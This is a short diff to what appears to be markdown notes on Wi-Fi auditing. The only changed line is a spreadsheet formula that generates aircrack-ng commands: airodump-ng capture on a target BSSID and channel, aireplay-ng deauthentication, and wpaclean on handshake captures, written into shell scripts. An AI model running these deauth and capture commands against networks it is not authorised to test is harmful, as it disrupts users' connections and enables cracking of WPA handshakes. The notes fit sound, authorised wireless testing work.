@@ -53,7 +53,7 @@ x	dump	death	clean
 ```
 ```sh
 x	dump	death	clean	sh
-=ВПР(A3;F:F;1;ЛОЖЬ) 	=СЦЕПИТЬ("airodump-ng --bssid ";A3;" ";" --channel ";D3;" ";" wlan0 -w ";N3) 	=СЦЕПИТЬ("aireplay-ng --deauth 10 -a ";A3;" ";"wlan0") 	=СЦЕПИТЬ("watch -n 1 wpaclean clean_";N3;".cap ";N3;"-01.cap")	=СЦЕПИТЬ("echo airodump-ng --bssid ";A3;" --channel ";D3;" wlan0 -w ";N3;" > 1.sh && echo aireplay-ng --deauth 10 -a ";A3;" wlan0 > 2.sh && echo watch -n 1 wpaclean clean_";N3;".cap ";N3;".cap > 3.sh && chmod
+=ВПР(A3;F:F;1;ЛОЖЬ) 	=СЦЕПИТЬ("airodump-ng --bssid ";A3;" ";" --channel ";D3;" ";" wlan0 -w ";N3) 	=СЦЕПИТЬ("aireplay-ng --deauth 10 -a ";A3;" ";"wlan0") 	=СЦЕПИТЬ("watch -n 1 wpaclean clean_";N3;".cap ";N3;"-01.cap")	=СЦЕПИТЬ("echo airodump-ng --bssid ";A3;" --channel ";D3;" wlan0 -w ";N3;" > 1.sh && echo aireplay-ng --deauth 10 -a ";A3;" wlan0 > 2.sh && echo watch -n 1 wpaclean clean_";N3;".cap ";N3;".cap > 3.sh && chmod")
 
 ```
 ### Reset wifi adapter to managed mode
